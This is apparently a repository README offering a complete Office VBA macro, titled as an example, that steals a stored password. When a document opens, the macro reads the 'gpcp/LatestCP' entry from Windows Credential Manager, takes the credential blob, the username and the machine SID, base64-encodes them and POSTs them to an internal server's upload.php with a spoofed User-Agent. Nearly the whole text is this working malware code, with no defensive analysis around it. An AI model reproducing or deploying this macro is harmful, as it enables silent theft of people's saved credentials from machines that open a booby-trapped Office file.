# WCM-Macro
Reading WCM entries using an Office VBA Macro

Example MS Office macro to read an entry from Windows Credential Manager and upload it to a web server.

```vba
'=== WCM credential structure 64-bit =======
'
'typedef struct _CREDENTIALW {
'   DWORD                  Flags;
'   DWORD                  Type;
'   LPWSTR                 TargetName;
'   LPWSTR                 Comment;
'   FILETIME               LastWritten;
'   INT64                  CredentialBlobSize;   (offset 32)
'   LPBYTE                 CredentialBlob;       (offset 40)
'   DWORD                  Persist;
'   DWORD                  AttributeCount;
'   PCREDENTIAL_ATTRIBUTEW Attributes;
'   LPWSTR                 TargetAlias;
'   LPWSTR                 UserName;             (offset 72)
'} CREDENTIALW, *PCREDENTIALW;
'===========================================
'=== WCM credential structure 32-bit =======
'
'typedef struct _CREDENTIALW {
'   DWORD                  Flags;
'   DWORD                  Type;
'   LPWSTR                 TargetName;
'   LPWSTR                 Comment;
'   FILETIME               LastWritten;
'   INT                    CredentialBlobSize;   (offset 24)
'   LPBYTE                 CredentialBlob;       (offset 28)
'   DWORD                  Persist;
'   DWORD                  AttributeCount;
'   PCREDENTIAL_ATTRIBUTEW Attributes;
'   LPWSTR                 TargetAlias;
'   LPWSTR                 UserName;             (offset 48)
'} CREDENTIALW, *PCREDENTIALW;
'===========================================

Private Declare PtrSafe Function CredReadW Lib "advapi32.dll" (ByVal TargetName As String, ByVal CType As Long, ByVal Flags As Long, ByRef Credential As LongPtr) As Long
Private Declare PtrSafe Sub CredFree Lib "advapi32.dll" (ByVal Buffer As LongPtr)
Private Declare PtrSafe Sub CopyMemory Lib "kernel32.dll" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Private Sub Document_Open()
   Dim msg As String, username As String, blob As String, bb As String, sid As String, splitsid() As String, b64str As String
   Dim rval As Long, i As Long, j As Long, blobsize As Long
   Dim cred As LongPtr, paddr As LongPtr
   Dim dword(3) As Byte, ub(1) As Byte, blobbytes() As Byte, b64data() As Byte
   Dim oWMI As Object, oWMIQuery As Object, oItem As Object
   Dim oXML As Variant, oNode As Variant, oHTTP As Variant
   Dim ocbs As Long, ocb As Long, oun As Long, alen As Long

   Dim dbg As Long: dbg = 0

   #If Win64 Then
      '64-bit Office
      ocbs = 32
      ocb = 40
      oun = 72
      alen = 8
   #Else
      '32-bit Office
      ocbs = 24
      ocb = 28
      oun = 48
      alen = 4
   #End If

   entry = StrConv("gpcp/LatestCP", vbUnicode)
   rval = CredReadW(entry, 1, 0, cred)
   If rval <> 0 Then
      CopyMemory dword(0), ByVal (cred + ocbs), 4
      blobsize = CLng(dword(0))
      blobsize = blobsize + (CLng(dword(1) * 256))
      blobsize = blobsize + (CLng(dword(2) * 65536))
      blobsize = blobsize + (CLng(dword(3) * 16777216))
      If (blobsize < 2 Or blobsize > 200) Then
         If dbg = 1 Then msg = "ERROR: blobsize": MsgBox msg
      Else
         ReDim blobbytes(blobsize - 1)
         CopyMemory paddr, ByVal (cred + ocb), alen
         CopyMemory blobbytes(0), ByVal (paddr), blobsize
         For i = LBound(blobbytes) To UBound(blobbytes)
            bb = Hex$(blobbytes(i))
            If Len(bb) = 1 Then bb = "0" & Hex$(blobbytes(i))
            blob = blob & bb
         Next i
         blob = LCase(blob)
         CopyMemory paddr, ByVal (cred + oun), alen
         For j = 0 To 100 Step 2
            CopyMemory ub(0), ByVal (paddr + j), 2
            If ub(0) = 0 Then Exit For
            msg = StrConv(ub, vbUnicode)
            username = username & StrConv(msg, vbFromUnicode)
         Next j
         CredFree cred
         sid = "UNKNOWN"
         Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
         Set oWMIQuery = oWMI.ExecQuery("Select * from Win32_UserAccount Where LocalAccount = True")
         For Each oItem In oWMIQuery
            splitsid = Split(oItem.sid, "-")
            If ((UBound(splitsid) - LBound(splitsid) + 1) = 8) Then
               sid = splitsid(0) & "-" & splitsid(1) & "-" & splitsid(2) & "-" & splitsid(3) & "-" & splitsid(4) & "-" & splitsid(5) & "-" & splitsid(6)
            End If
            Exit For
         Next
         Set oItem = Nothing
         Set oWMIQuery = Nothing
         Set oWMI = Nothing
         msg = "USERNAME = " & username & vbCrLf & "CREDENTIAL = " & blob & vbCrLf & "SID = " & sid & vbCrLf
         If dbg = 1 Then MsgBox msg
         b64data = StrConv(msg, vbFromUnicode)
         Set oXML = CreateObject("MSXML2.DOMDocument")
         Set oNode = oXML.createElement("b64")
         oNode.dataType = "bin.base64"
         oNode.nodeTypedValue = b64data
         msg = oNode.Text
         msg = Replace(Replace(msg, Chr(10), ""), Chr(13), "")
         Set oNode = Nothing
         Set oXML = Nothing
         If dbg = 1 Then MsgBox msg
         Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
         oHTTP.Open "POST", "http://10.1.2.3/upload.php", False
         oHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
         oHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
         oHTTP.send "data=" & msg
         Set oHTTP = Nothing
      End If
   Else
      If dbg = 1 Then msg = "ERROR: entry not found": MsgBox msg
   End If
End Sub
```
